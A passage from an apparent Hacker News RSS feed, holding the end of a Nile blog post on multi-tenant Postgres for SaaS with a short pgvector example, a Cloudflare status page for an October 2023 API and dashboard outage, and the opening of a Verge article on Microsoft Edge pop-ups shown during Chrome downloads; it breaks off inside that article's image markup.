<img src="https://www.thenile.dev/blog/authcode.png" alt="“Auth Code&quot;"></p>
<p>For permissions, basic enforcement of what data users get access to should be easier than it is today. When a user belongs to a specific tenant, access should automatically be restricted to other tenants. You don’t need application logic or complex SQL policies to enforce and maintain this. In addition, permissions should have a flexible language to help define fine-grained column-level resource permissions. The best part is that no instrumentations are required in code, which is often buggy due to the different paths that need to be secured. Instead, permission at source is the strongest security guarantee you can get.</p>
<p>While the database should provide a fantastic solution out of the box, it should also be flexible for users to bring their own auth. This includes building your own authentication or integrating another third-party auth with the database. Great developer platforms can provide flexibility and let developers have finer control over how they want to build out their applications.</p>
<h3 id="domain-and-tenant-aware-ai-native-architecture">Domain and tenant-aware AI-native architecture</h3>
<p>Every SaaS application will be an AI-native application like every software application was a SaaS-native application when SaaS happened. SaaS revolutionized how software was delivered. AI will revolutionize how software is experienced.</p>
<p>AI for SaaS needs to be specific to the domain and tenant. For example,</p>
<ol>
<li>A corporate wiki (e.g., Confluence, Notion) where the employees can perform a semantic search on their company data</li>
<li>A chatbot for a CRM (e.g., Salesforce, Hubspot) that sales reps can use to ask questions about past and future customer deals and can have a back-and-forth conversation</li>
<li>An autopilot for developers in their code repository (Github, Gitlab) to improve productivity. The autopilot should run on the company's code as well, apart from learning from public repositories.</li>
</ol>
<p>A powerful architecture to achieve this is Retrieval augmented generation(RAG). The idea is to prevent large language models from hallucinating by augmenting the prompt with relevant context. This is usually done by converting the tenant's data set and the query to a common format called embeddings. The prompt issued by the user belonging to a specific tenant will be augmented with more context from that tenant's embeddings. This helps LLMs to be more contextual and also more secure.</p>
<p>A database for SaaS should have native support for storing vector embeddings per tenant. It should also help store the metadata relevant to each tenant and the embeddings. Given Postgres is our choice, the pgvector extension combined with tenant virtualization would be powerful.</p>
<pre><code><span>create</span> <span>table</span> wiki_documents(tenant_id uuid, id <span>integer</span>, embedding vector(<span>3</span>));

<span>insert</span> <span>into</span> wiki_documents(tenant_id, id, embedding)
<span>values</span> (<span>'018ade1a-7843-7e60-9686-714bab650998'</span>, <span>1</span>, <span>'[1,2,3]'</span>);

<span>select</span> embedding <span>&lt;</span><span>-</span><span>&gt;</span> <span>'[3,1,2]'</span> <span>as</span> distance <span>from</span> wiki_documents;
</code></pre>
<p>You get the following benefits with such a system:</p>
<ol>
<li>Embeddings and metadata computed and stored per tenant</li>
<li>Embeddings and metadata are stored near the customer to speed up the first-byte response to a query</li>
<li>HNSW and IVFLAT index support from pg_vector</li>
<li>Unlimited scaling of embeddings since tenants can be distributed and sharded. HNSW is a pretty resource-intensive</li>
<li>Purpose-built SDKs that integrate with LLM hosts such as OpenAI and Huggingface and vector embeddings.</li>
</ol>
<h3 id="serverless-and-cloud-native">Serverless and cloud-native</h3>
<p>Serverless is how developers will adopt databases in the next decade. Before anyone jumps to say, “There is no such thing as serverless. There are only other people's servers”, the intent of using serverless is to define the experience developers get. It does not mean that the database is implemented without any servers! A database for SaaS should allow developers to focus on their queries, use cases, and core application logic. Developers don’t have to worry about managing capacity, the server configurations, or paying for capacity they don’t use. This gets even more complex if you want to manage multiple databases for each tenant. A database should let you have any number of virtual tenant databases but give you all the goodness of serverless. It should enforce price limits and ensure developers don’t get a sticker shock. The goal of serverless is to care about developers, which is exactly what it should do.</p>
<p>The second thing is that the database needs to be built for the cloud. This means leveraging the native cloud infrastructure to build a highly scalable and elastic system. It makes sense to decouple storage and compute and push storage to cloud storage like S3. This helps to keep the compute stateless and makes it easier to scale them quickly. You still want to shard the tenants across databases and regions to provide placement flexibility (regional and infrastructure placement) and scale the storage as needed.</p>
<h3 id="tenant-level-insights-and-administration">Tenant-level insights and administration</h3>
<p>A huge part of building and running a SaaS application is to understand the growth and performance of each tenant and optimize it. This has been traditionally hard for SaaS. Most want a simple way to look up their active customers, users, and product usage to understand better how the different queries are performing for each customer.</p>
<p>The database should have native support for this. Given it understands tenant boundaries, users within those tenants, and all the queries executed in that context, it would be trivial to show relevant insights to the developers. Developers should be able to understand the growth of the product, how the query performs for each tenant, and past trends. All the performance metrics, usage metrics, and even logs can be understood for each tenant. Postgres tools such as pg_stats, EXPLAIN, and ANALYZE should work and provide insights by tenant.
<img src="https://www.thenile.dev/blog/nile_dashboard.png" alt="“Nile Dashboard”"></p>
<h3 id="world-class-developer-experience">World-class developer experience</h3>
<p>Databases still need to be made easier to use. While Postgres does a great job, there is still a lot of friction in the end-to-end developer journey to build SaaS applications with a cloud-native database. Developers should be able to test locally with the DB for a rapid feedback loop on their laptop, create test databases to apply schema changes, and then migrate to production. This whole experience should be integrated well with a change management system like GitHub. Lastly, ensuring a thriving developer community around the database is key to helping each other and learning quickly.</p>
<h3 id="and-some-more">And some more</h3>
<p>There are many more things I chose not to talk about now. Things like propagating real-time changes per tenant to the front end, supporting analytics to build data-centric applications, and leveraging usage data per tenant for monetization are all critical topics in building SaaS. The tenant virtualization is the basic building block. Many SaaS tooling and integrations can be built on this foundation to make it easy to build and scale the product. We would love to hear your feedback and thoughts about this on our <a href="https://github.com/niledatabase/niledatabase/discussions">GitHub discussion forum</a> or <a href="https://discord.gg/8UuBB84tTy">Discord community</a>.</p>
<h2 id="nile---a-company-to-accelerate-modern-saas">Nile - a company to accelerate modern SaaS</h2>
<p>Nile is a company that was started to make the database that I explained a reality. The mission of Nile is to enable developers to accelerate the next billion modern SaaS applications. What we will build at Nile will help accomplish this and truly change the future of SaaS. Nile will deliver on this promise. If you are building SaaS, we would love to talk to you. If you are an amazing engineer, we would love to have you join us in this mission.</p>
<p>You can try out Nile by <a href="https://www.thenile.dev/">signing up for our waitlist</a> today. We are onboarding new users every day. You can get started with one of our quickstarts. We also have <a href="https://www.thenile.dev/templates">templates and demos</a> that will make it easy to get started. We would love to have you try out Nile, give us feedback, and help us build something truly world-class. If you need help, you can reach us on our <a href="https://github.com/niledatabase/niledatabase/discussions">GitHub discussion forum</a> or our <a href="https://discord.gg/8UuBB84tTy">Discord community</a>. Follow us on <a href="https://twitter.com/niledatabase">Twitter</a> or <a href="https://www.linkedin.com/company/niledatabase/">Linkedin</a> to get regular updates.</p>
<p>We are building something truly wonderful and are excited about this journey!</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Cloudflare API, dashboard, tunnels down (136 pts)]]></title>
            <link>https://www.cloudflarestatus.com/incidents/s1hkh315y9s9</link>
            <guid>38014582</guid>
            <pubDate>Wed, 25 Oct 2023 16:31:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cloudflarestatus.com/incidents/s1hkh315y9s9">https://www.cloudflarestatus.com/incidents/s1hkh315y9s9</a>, See on <a href="https://news.ycombinator.com/item?id=38014582">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    <div>
      <p>Cloudflare Dashboard and Cloudflare API service issues</p>
      
    </div>

    <div>
      <!-- postmortem if it's published -->

      <!-- incident updates in reverse order -->
        <div>
          <p>
            Monitoring
          </p>
          <div>
            <p><span>A fix has been implemented and we are monitoring the results.<p>Customers using IPsec tunnels who are still impacted should try bouncing their IKE sessions to force rekeying.</p></span>
            </p>
            <p>
              Posted <span data-datetime-unix="1698256294000"></span>Oct <var data-var="date">25</var>, <var data-var="year">2023</var> - <var data-var="time">17:51</var> UTC
            </p>
          </div>
        </div>
        <div>
          <p>
            Update
          </p>
          <div>
            <p><span>We have fixed the issue impacting Alerts, Dashboard functionality, Zero Trust, WARP Waiting Room, Gateway, Stream, API Shield,  Workers. We are monitoring the results for these products.<p>However, we are still working on a fix for resolving the issue on Cloudflare Pages, Cloudflare Tunnels, and Magic WAN</p></span>
            </p>
            <p>
              Posted <span data-datetime-unix="1698255326000"></span>Oct <var data-var="date">25</var>, <var data-var="year">2023</var> - <var data-var="time">17:35</var> UTC
            </p>
          </div>
        </div>
        <div>
          <p>
            Identified
          </p>
          <div>
            <p><span>The issue has been identified and a fix is being implemented.</span>
            </p>
            <p>
              Posted <span data-datetime-unix="1698252494000"></span>Oct <var data-var="date">25</var>, <var data-var="year">2023</var> - <var data-var="time">16:48</var> UTC
            </p>
          </div>
        </div>
        <div>
          <p>
            Update
          </p>
          <div>
            <p><span>We are continuing to investigate this issue.<p>This issue is impacting all services that rely on our API infrastructure including Alerts, Dashboard functionality, Zero Trust, WARP, Cloudflared, Waiting Room, Gateway, Stream, Magic WAN, API Shield, Pages, Workers.</p></span>
            </p>
            <p>
              Posted <span data-datetime-unix="1698249346000"></span>Oct <var data-var="date">25</var>, <var data-var="year">2023</var> - <var data-var="time">15:55</var> UTC
            </p>
          </div>
        </div>
        <div>
          <p>
            Update
          </p>
          <div>
            <p><span>We are continuing to investigate this issue.</span>
            </p>
            <p>
              Posted <span data-datetime-unix="1698249005000"></span>Oct <var data-var="date">25</var>, <var data-var="year">2023</var> - <var data-var="time">15:50</var> UTC
            </p>
          </div>
        </div>
        <div>
          <p>
            Update
          </p>
          <div>
            <p><span>We are continuing to investigate this issue.</span>
            </p>
            <p>
              Posted <span data-datetime-unix="1698247958000"></span>Oct <var data-var="date">25</var>, <var data-var="year">2023</var> - <var data-var="time">15:32</var> UTC
            </p>
          </div>
        </div>
        <div>
          <p>
            Investigating
          </p>
          <div>
            <p><span>Cloudflare is investigating issues with Cloudflare Dashboard and related APIs.<p>This issue is impacting all services that rely on our API infrastructure including Alerts, Dashboard functionality, Zero Trust, WARP, Cloudflared, Waiting Room, Gateway, Stream, Magic WAN, API Shield, Pages, Workers. <br>Customers using the Dashboard / Cloudflare APIs are impacted as requests might fail and/or errors may be displayed.</p></span>
            </p>
            <p>
              Posted <span data-datetime-unix="1698247051000"></span>Oct <var data-var="date">25</var>, <var data-var="year">2023</var> - <var data-var="time">15:17</var> UTC
            </p>
          </div>
        </div>

      <!-- affected components -->
        <p>
          This incident affects: Cloudflare Sites and Services (API, Dashboard, Magic Transit, Magic WAN, Notifications, Pages, Tunnel, Workers, Zero Trust).
        </p>
    </div>

    
  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Microsoft now thirstily injects a poll when you download Google Chrome (147 pts)]]></title>
            <link>https://www.theverge.com/23930960/microsoft-edge-google-chrome-poll-why-try-another-browser</link>
            <guid>38014168</guid>
            <pubDate>Wed, 25 Oct 2023 16:00:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theverge.com/23930960/microsoft-edge-google-chrome-poll-why-try-another-browser">https://www.theverge.com/23930960/microsoft-edge-google-chrome-poll-why-try-another-browser</a>, See on <a href="https://news.ycombinator.com/item?id=38014168">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article id="content"><div><div><div><h2>Microsoft now thirstily injects a poll when you download Google Chrome</h2><p><span><span> / </span><h2>“Can you please take a minute to tell us why you are trying another browser?”</h2></span></p></div><div><p><span>By</span> <span><span></span> <span><a href="https://www.theverge.com/authors/sean-hollister">Sean Hollister</a></span><span>, <span>a senior editor and founding member of The Verge who covers gadgets, games, and toys. He spent 15 years editing the likes of CNET, Gizmodo, and Engadget.</span></span></span></p><p><time datetime="2023-10-25T00:12:18.788Z"> <!-- -->Oct 25, 2023, 12:12 AM UTC</time><span>|</span></p><div><h2>Share this story</h2></div></div></div><div><figure><span><span></span><img alt="Microsoft Edge now pops up a poll after you press the “Download Chrome” button." sizes="(max-width: 768px) calc(100vw - 100px), (max-width: 1180px) 700px, 600px" srcset="https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/16x11/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 16w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/32x21/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 32w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/48x32/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 48w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/64x43/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 64w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/96x64/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 96w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/128x85/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 128w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/256x171/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 256w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/376x251/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 376w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/384x256/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 384w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/415x277/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 415w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/480x320/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 480w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/540x360/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 540w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/640x427/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 640w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/750x500/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 750w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/828x552/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 828w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/1080x720/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 1080w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/1200x800/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 1200w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/1440x960/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 1440w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/1920x1280/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 1920w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/2048x1365/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 2048w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/2400x1600/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg 2400w" src="https://duet-cdn.vox-cdn.com/thumbor/0x0:1174x788/2400x1600/filters:focal(587x394:588x395):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029208/NVIDIA_Share_wDQfiR22KU.jpg" decoding="async" data-nimg="responsive"></span><div><figcaption><em>Microsoft Edge now pops up a poll after you press the “Download Chrome” button.</em></figcaption> <p><cite>Screenshot by Sean Hollister / The Verge</cite></p></div></figure></div></div><div><div><p><a href="https://youtu.be/O6rHeD5x2tI?si=IxGULBEJ0VqCGcFo&amp;t=35">How many licks</a> does it take to get to the center of a Google Chrome download in Microsoft’s Edge web browser? How many times will the company try to steer me away?</p><p>Let’s check! </p><p><h3>One:</h3></p><div><div role="button" aria-label="Zoom" tabindex="0"><figure><div><p><span><img alt="“There’s no need to download a new web browser,” reads the top of a search for “Chrome download” in Microsoft Edge." loading="lazy" decoding="async" data-nimg="fill" sizes="(max-width: 1023px) 100vw, 744px" srcset="https://duet-cdn.vox-cdn.com/thumbor/0x0:880x439/376x188/filters:focal(440x220:441x221):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029225/msedge_yoCVyeYDEW.jpg 376w, https://duet-cdn.vox-cdn.com/thumbor/0x0:880x439/384x192/filters:focal(440x220:441x221):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029225/msedge_yoCVyeYDEW.jpg 384w, https://duet-cdn.vox-cdn.com/thumbor/0x0:880x439/415x207/filters:focal(440x220:441x221):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029225/msedge_yoCVyeYDEW.jpg 415w, https://duet-cdn.vox-cdn.com/thumbor/0x0:880x439/480x239/filters:focal(440x220:441x221):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029225/msedge_yoCVyeYDEW.jpg 480w, https://duet-cdn.vox-cdn.com/thumbor/0x0:880x439/540x269/filters:focal(440x220:441x221):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029225/msedge_yoCVyeYDEW.jpg 540w, https://duet-cdn.vox-cdn.com/thumbor/0x0:880x439/640x319/filters:focal(440x220:441x221):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029225/msedge_yoCVyeYDEW.jpg 640w, https://duet-cdn.vox-cdn.com/thumbor/0x0:880x439/750x374/filters:focal(440x220:441x221):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029225/msedge_yoCVyeYDEW.jpg 750w, https://duet-cdn.vox-cdn.com/thumbor/0x0:880x439/828x413/filters:focal(440x220:441x221):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029225/msedge_yoCVyeYDEW.jpg 828w, https://duet-cdn.vox-cdn.com/thumbor/0x0:880x439/1080x539/filters:focal(440x220:441x221):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029225/msedge_yoCVyeYDEW.jpg 1080w, https://duet-cdn.vox-cdn.com/thumbor/0x0:880x439/1200x599/filters:focal(440x220:441x221):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029225/msedge_yoCVyeYDEW.jpg 1200w, https://duet-cdn.vox-cdn.com/thumbor/0x0:880x439/1440x718/filters:focal(440x220:441x221):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029225/msedge_yoCVyeYDEW.jpg 1440w, https://duet-cdn.vox-cdn.com/thumbor/0x0:880x439/1920x958/filters:focal(440x220:441x221):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029225/msedge_yoCVyeYDEW.jpg 1920w, https://duet-cdn.vox-cdn.com/thumbor/0x0:880x439/2048x1022/filters:focal(440x220:441x221):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029225/msedge_yoCVyeYDEW.jpg 2048w, https://duet-cdn.vox-cdn.com/thumbor/0x0:880x439/2400x1197/filters:focal(440x220:441x221):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029225/msedge_yoCVyeYDEW.jpg 2400w" src="https://duet-cdn.vox-cdn.com/thumbor/0x0:880x439/2400x1197/filters:focal(440x220:441x221):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029225/msedge_yoCVyeYDEW.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p></div></figure></div><div><figcaption><em>“There’s no need to download a new web browser,” reads the top of a search for “Chrome download” in Microsoft Edge.</em></figcaption> <p><cite>Screenshot by Sean Hollister / The Verge</cite></p></div></div><p><h3>Two:</h3></p><div><div role="button" aria-label="Zoom" tabindex="0"><figure><div><p><span><img alt="“Microsoft edge runs on the same technology as Chrome, with the added trust of Microsoft,” reads a pop-up that appears after you land on Google’s site." loading="lazy" decoding="async" data-nimg="fill" sizes="(max-width: 1023px) 100vw, 744px" srcset="https://duet-cdn.vox-cdn.com/thumbor/0x0:603x354/376x221/filters:focal(302x177:303x178):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029229/msedge_6Xy4AsRXYT.jpg 376w, https://duet-cdn.vox-cdn.com/thumbor/0x0:603x354/384x225/filters:focal(302x177:303x178):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029229/msedge_6Xy4AsRXYT.jpg 384w, https://duet-cdn.vox-cdn.com/thumbor/0x0:603x354/415x244/filters:focal(302x177:303x178):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029229/msedge_6Xy4AsRXYT.jpg 415w, https://duet-cdn.vox-cdn.com/thumbor/0x0:603x354/480x282/filters:focal(302x177:303x178):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029229/msedge_6Xy4AsRXYT.jpg 480w, https://duet-cdn.vox-cdn.com/thumbor/0x0:603x354/540x317/filters:focal(302x177:303x178):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029229/msedge_6Xy4AsRXYT.jpg 540w, https://duet-cdn.vox-cdn.com/thumbor/0x0:603x354/640x376/filters:focal(302x177:303x178):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029229/msedge_6Xy4AsRXYT.jpg 640w, https://duet-cdn.vox-cdn.com/thumbor/0x0:603x354/750x440/filters:focal(302x177:303x178):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029229/msedge_6Xy4AsRXYT.jpg 750w, https://duet-cdn.vox-cdn.com/thumbor/0x0:603x354/828x486/filters:focal(302x177:303x178):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029229/msedge_6Xy4AsRXYT.jpg 828w, https://duet-cdn.vox-cdn.com/thumbor/0x0:603x354/1080x634/filters:focal(302x177:303x178):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029229/msedge_6Xy4AsRXYT.jpg 1080w, https://duet-cdn.vox-cdn.com/thumbor/0x0:603x354/1200x704/filters:focal(302x177:303x178):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029229/msedge_6Xy4AsRXYT.jpg 1200w, https://duet-cdn.vox-cdn.com/thumbor/0x0:603x354/1440x845/filters:focal(302x177:303x178):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029229/msedge_6Xy4AsRXYT.jpg 1440w, https://duet-cdn.vox-cdn.com/thumbor/0x0:603x354/1920x1127/filters:focal(302x177:303x178):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029229/msedge_6Xy4AsRXYT.jpg 1920w, https://duet-cdn.vox-cdn.com/thumbor/0x0:603x354/2048x1202/filters:focal(302x177:303x178):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029229/msedge_6Xy4AsRXYT.jpg 2048w, https://duet-cdn.vox-cdn.com/thumbor/0x0:603x354/2400x1409/filters:focal(302x177:303x178):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029229/msedge_6Xy4AsRXYT.jpg 2400w" src="https://duet-cdn.vox-cdn.com/thumbor/0x0:603x354/2400x1409/filters:focal(302x177:303x178):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029229/msedge_6Xy4AsRXYT.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p></div></figure></div><div><figcaption><em>“Microsoft edge runs on the same technology as Chrome, with the added trust of Microsoft,” reads a pop-up that appears after you land on Google’s site.</em></figcaption> <p><cite>Screenshot by Sean Hollister / The Verge</cite></p></div></div><p><h3>Three:</h3></p><div><div role="button" aria-label="Zoom" tabindex="0"><figure><div><p><span><img alt="“We love having you! Can you please take a minute to tell us why you are trying another browser?” reads a new pop-up poll. " loading="lazy" decoding="async" data-nimg="fill" sizes="(max-width: 1023px) 100vw, 744px" srcset="https://duet-cdn.vox-cdn.com/thumbor/0x0:385x579/376x565/filters:focal(193x290:194x291):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029231/msedge_gzOf0nzwpc.jpg 376w, https://duet-cdn.vox-cdn.com/thumbor/0x0:385x579/384x577/filters:focal(193x290:194x291):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029231/msedge_gzOf0nzwpc.jpg 384w, https://duet-cdn.vox-cdn.com/thumbor/0x0:385x579/415x624/filters:focal(193x290:194x291):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029231/msedge_gzOf0nzwpc.jpg 415w, https://duet-cdn.vox-cdn.com/thumbor/0x0:385x579/480x722/filters:focal(193x290:194x291):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029231/msedge_gzOf0nzwpc.jpg 480w, https://duet-cdn.vox-cdn.com/thumbor/0x0:385x579/540x812/filters:focal(193x290:194x291):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029231/msedge_gzOf0nzwpc.jpg 540w, https://duet-cdn.vox-cdn.com/thumbor/0x0:385x579/640x962/filters:focal(193x290:194x291):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029231/msedge_gzOf0nzwpc.jpg 640w, https://duet-cdn.vox-cdn.com/thumbor/0x0:385x579/750x1128/filters:focal(193x290:194x291):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029231/msedge_gzOf0nzwpc.jpg 750w, https://duet-cdn.vox-cdn.com/thumbor/0x0:385x579/828x1245/filters:focal(193x290:194x291):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029231/msedge_gzOf0nzwpc.jpg 828w, https://duet-cdn.vox-cdn.com/thumbor/0x0:385x579/1080x1624/filters:focal(193x290:194x291):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029231/msedge_gzOf0nzwpc.jpg 1080w, https://duet-cdn.vox-cdn.com/thumbor/0x0:385x579/1200x1805/filters:focal(193x290:194x291):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029231/msedge_gzOf0nzwpc.jpg 1200w, https://duet-cdn.vox-cdn.com/thumbor/0x0:385x579/1440x2166/filters:focal(193x290:194x291):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029231/msedge_gzOf0nzwpc.jpg 1440w, https://duet-cdn.vox-cdn.com/thumbor/0x0:385x579/1920x2887/filters:focal(193x290:194x291):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029231/msedge_gzOf0nzwpc.jpg 1920w, https://duet-cdn.vox-cdn.com/thumbor/0x0:385x579/2048x3080/filters:focal(193x290:194x291):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029231/msedge_gzOf0nzwpc.jpg 2048w, https://duet-cdn.vox-cdn.com/thumbor/0x0:385x579/2400x3609/filters:focal(193x290:194x291):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029231/msedge_gzOf0nzwpc.jpg 2400w" src="https://duet-cdn.vox-cdn.com/thumbor/0x0:385x579/2400x3609/filters:focal(193x290:194x291):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029231/msedge_gzOf0nzwpc.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p></div></figure></div><div><figcaption><em>“We love having you! Can you please take a minute to tell us why you are trying another browser?” reads a new pop-up poll. </em></figcaption> <p><cite>Screenshot by Sean Hollister / The Verge</cite></p></div></div><p><h3>Four:</h3></p><div><div role="button" aria-label="Zoom" tabindex="0"><figure><div><p><span><img alt="“Microsoft Edge runs on the same technology as Chrome, with the added trust of Microsoft,” reads an injected ad that appeared after my download." loading="lazy" decoding="async" data-nimg="fill" sizes="(max-width: 1023px) 100vw, 744px" srcset="https://duet-cdn.vox-cdn.com/thumbor/0x0:1112x622/376x210/filters:focal(556x311:557x312):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029232/msedge_He5soYyzls.jpg 376w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1112x622/384x215/filters:focal(556x311:557x312):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029232/msedge_He5soYyzls.jpg 384w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1112x622/415x232/filters:focal(556x311:557x312):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029232/msedge_He5soYyzls.jpg 415w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1112x622/480x268/filters:focal(556x311:557x312):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029232/msedge_He5soYyzls.jpg 480w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1112x622/540x302/filters:focal(556x311:557x312):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029232/msedge_He5soYyzls.jpg 540w, 